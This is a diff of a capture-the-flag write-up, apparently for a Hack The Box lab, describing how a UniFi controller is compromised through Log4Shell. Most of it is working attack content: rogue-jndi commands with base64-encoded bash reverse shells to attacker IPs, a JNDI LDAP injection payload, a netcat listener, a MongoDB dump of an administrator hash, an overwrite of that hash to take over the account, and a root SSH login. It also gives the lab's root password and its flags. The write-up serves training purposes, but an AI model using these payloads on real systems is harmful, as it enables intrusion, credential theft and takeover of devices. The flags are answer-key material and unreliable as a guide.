@@ -70,12 +70,95 @@ Once the Jar is compiled, you’ll have to craft a command to deliver the revers
 
 With that Base64 output, build your command in rogue-jndi:
 
-- `java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "{tun0}"`
+- `java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,{BASE64 STRING}}|{base64,-d}|{bash,-i}" --hostname "{tun0}"`
 
 Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to
 capture the reverse shell.
 
 - `nc -lvp 4444`
 
+Open Burpsuite and intercept request when i try to login. Add this payload in remember:
+- `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` then `forward`
 
+- having a good shell `/bin/bash -i`
 
+```
+unifi@unified:/usr/lib/unifi$ whoami
+whoami
+unifi
+```
+
+## Escalade Privilege
+
+display information about active processes
+a: Shows processes for all users.
+u: Displays the user/owner of the processes.
+x: Shows processes without a controlling terminal.
+
+- `ps aux`
+
+```
+ ps aux
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+unifi          1  0.0  0.0   1080     4 ?        Ss   13:00   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
+unifi          7  0.0  0.1  18512  3180 ?        S    13:00   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
+unifi         17  0.9 25.0 3671844 509008 ?      Sl   13:00   0:28 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
+unifi         67  0.1  4.1 1101700 84888 ?       Sl   13:00   0:05 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+unifi        886  0.0  0.1  18380  3172 ?        S    13:28   0:00 bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTYzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}
+unifi        890  0.0  0.1  18512  3396 ?        S    13:28   0:00 bash -i
+unifi        893  0.0  0.1  18380  3192 ?        S    13:28   0:00 bash
+unifi       1113  0.0  0.1  18512  3496 ?        S    13:37   0:00 /bin/bash -i
+unifi       1504  0.0  0.1  34408  2948 ?        R    13:51   0:00 ps aux
+```
+
+- `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+
+```
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+{
+        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+        "time_created" : NumberLong(1640900495),
+        "last_site_name" : "default",
+<SNIP>
+```
+
+## Modify password 
+
+1. **Generate password with mdpasswd**:
+
+    The output reveals a user called Administrator. Their password hash is located in the x_shadow variable but
+    in this instance it cannot be cracked with any password cracking utilities. Instead we can change the
+    x_shadow password hash with our very own created hash in order to replace the administrators password
+    and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility.
+
+    - `mkpasswd -m sha-512 Password1234`
+    - result : `$6$oQn89ZI6UCtL2kTx$rFRyJkyEy2Zq2Sf/uBjnA.89sQ.A45TaT1nQbCBvzUoMbvCBK2sTplJF4Z3sPedskjPdywhLBvv7KEQOXnNq71`
+
+2. **Replace password**:
+
+    - `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("{ObjectIdAdministrateur}")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`
+
+    - mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$oQn89ZI6UCtL2kTx$rFRyJkyEy2Zq2Sf/uBjnA.89sQ.A45TaT1nQbCBvzUoMbvCBK2sTplJF4Z3sPedskjPdywhLBvv7KEQOXnNq71"}})'
+
+3. **Connect over Administrator**
+
+    - In website over administrator, we can the password of root that is `NotACrackablePassword4U2022`
+
+    - `ssh root@{TARGET_IP}`
+    ```
+    root@unified:~# whoami
+    root
+    ```
+
+## Flag
+
+user : `6ced1a6a89e666c0620cdb10262ba127`
+
+root : `e50bc93c75b634e4b272d2f771c33681`
